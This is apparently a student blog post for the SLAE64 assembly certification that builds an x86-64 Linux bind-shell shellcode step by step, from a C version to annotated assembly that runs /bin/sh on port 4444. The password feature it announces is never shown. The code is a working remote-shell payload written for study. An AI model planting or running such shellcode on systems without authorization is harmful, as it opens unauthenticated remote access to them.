Assignment #1 – Bind shell with password
========================================

The objective of this assignment was to create a shellcode that binds to a port and, if provided with the correct password, spawns a shell. The final shellcode must not have any null bytes.

Writing the bind shell
----------------------

I started by writing the bind shell itself, with no password. To do this it's easier to start from a C version like the one below. This code has no error checking at all; and the shellcode won't have either.

    #include <stdlib.h>
    #include <unistd.h>
    #include <strings.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>

    int main(int argc, char **argv)
    {
        struct sockaddr_in server;
        int sock, new;
        char *arguments[] = {"/bin/sh", 0};
        
        sock = socket(AF_INET, SOCK_STREAM, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[1]));
        server.sin_addr.s_addr = INADDR_ANY;
        bzero(&server.sin_zero, 8);

        bind(sock, (struct sockaddr *)&server, sizeof(server));
        listen(sock, 2);
        new = accept(sock, NULL, NULL);
        close(sock);

        dup2(new, 0);
        dup2(new, 1);
        dup2(new, 2);

        execve(arguments[0], arguments, NULL);
    }

Breaking it down we have seven parts:

  1. `socket()`. Create a socket to use in communications
  1. `bind()`. Bind a socket to an address
  1. `listen()`. Mark the socket as being able to accept incoming connections
  1. `accept()`. Accept connection requests and create new sockets
  1. `close()`. Close the listening socket
  1. `dup2()`. Duplicate file descriptors to connect `stdin`, `stdout` and `stderr` to the incoming connection
  1. `execve()`. Replace the current process image with `/bin/sh`

With the C code as reference each os these parts was implemented in assembly as follows.

----

### `socket()`

You need to call [`syscall(2)`][man_2_syscall] with the appropriate arguments. To figure out the values of the macros `AF_INET` and `SOCK_STREAM` you can use Python:

    $ python3
    >>>
    >>> import socket
    >>> socket.AF_INET
    <AddressFamily.AF_INET: 2>
    >>> socket.SOCK_STREAM
    <SocketKind.SOCK_STREAM: 1>

The numbers for syscalls can be found in `/usr/include/asm/unistd_64.h`. From that file we know `socket` corresponds to syscall 41.

    ...
    #define __NR_socket 41
    #define __NR_connect 42
    #define __NR_accept 43
    ...

You can a syscall by putting its number in RAX and its arguments in RDI, RSI, RDX, R10, R8, R9, in that order. Lastly you can the syscall with the `syscall` instruction. The return value of the syscall is stored in RAX. With all this information we are able to write the following code.

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rdi, rax

The return value is moved to RDI for later use in other syscalls.

### `bind()`

Calling [`bind(2)`][man_2_bind] is probably the part of this shellcode most prone to confusion. The first argument is the ID (know as "file descriptor") of the socket created by `socket`.

The second argument is a pointer to a structure of the type `sockaddr_in`. So you need to create this structure in memory and then get a pointer to it. To understand this structure [Beej's Guide to Network Programming][beej_sockaddr_in] is a valuable resource. We see `sockaddr_in` is declared as follows:

    struct sockaddr_in {
        short            sin_family;
        unsigned short   sin_port;
        struct in_addr   sin_addr;
        char             sin_zero[8];
    };

This definition lets you know the memory layout for the structure. `sin_family` and `sin_port` are `short` which correspond to 2 bytes. `sin_addr` is a `struct in_addr` which from Beej's Guide you can see corresponds to a `long`, i.e. 4 bytes. And lastly `sin_zero` is an 8-`char` array, or 8 bytes in total. So the memory layout of `sockaddr_in` in the stack can be represented as follows:

      0         1   2         3   4                       7
    +------+------+------+------+------+------+------+------+
    | sin_family  |  sin_port   |         sin_addr          |    ↑ lower addresses
    +------+------+------+------+------+------+------+------+    |  stack
    |                       sin_zero                        |    | higher addresses
    +------+------+------+------+------+------+------+------+

Since the stack grows from higher to lower addresses the structure members are pushed onto the stack in reverse order from the one they appear in the declaration: `sin_zero`, then `sin_addr`, `sin_port` and lastly `sin_family`.

In the C code you can see the port to bind to is passed to `htons()`. This functions stands for "host-to-network-short" and converts ports numbers from the the format used in the host (your PC) to that used in the network (your local network, the Internet, etc.). This is closely related with [endianness][endianness]. From `man htons` you see that on i386 network byte order corresponds to big-endian:

> On the i386 the host byte order is Least Significant Byte first, whereas the network byte order, as used on the Internet, is Most Significant Byte first.

Since the endianness of Intel processors is litte-endian you have to push the bytes of the port in reverse order: if you want to use port 4444 (hex 0x115c) you push 0x5c11. You can use Python to do this conversion for you:

    $ python3
    >>>
    >>> import socket
    >>> hex(socket.htons(4444))
    '0x5c11'

At last the third argument to the `bind` syscall is the size of the address structure, which as seen in the memory diagram above is 16 bytes.

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49

    xor rax, rax
    push rax
    mov dword [rsp-4], eax
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    mov rax, 49
    ; rdi already set before
    mov rsi, rsp ; &server
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

### `listen()`

    ; listen(sock, 2)
    ; __NR_listen = 50

    mov rax, 50
    ; rdi already set before
    mov rsi, 2
    syscall

### `accept()`

The ID for a new socket is returned. The value is saved into RBX for later use with `dup2`.

    ; new = accept(sock, NULL, NULL);
    ; __NR_accept = 43

    mov rax, 43
    ; rdi already set before
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rbx, rax

### `close()`

Closing the listening socket is a good practice, but it is now strictly needed for the shellcode to work. I removed it in the final version.

    ; close(sock)
    ; __NR_close = 3

    mov rax, 3
    ; rdi already set before
    syscall

### `dup2()`

These syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.

    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

### `execve()`

    ; int execve(const char *path, char *const argv[], char *const envp[])
    ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
    ; rsi, argv = (char**) (/bin//sh, 0x00)
    ; rdx, envp = &0x00

    xor rax, rax
    push rax
    mov rdx, rsp ; *rdx = &0x00

    mov rsi, 0x68732f2f6e69622f
    push rsi
    mov rdi, rsp ; rdi = (char*) /bin//sh

    push rax
    push rdi
    mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)

    mov al, 59
    syscall



[man_2_syscall]: https://linux.die.net/man/2/syscall
[man_2_bind]: https://linux.die.net/man/2/bind
[beej_sockaddr_in]: https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
[endianness]: https://en.wikipedia.org/wiki/Endianness

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
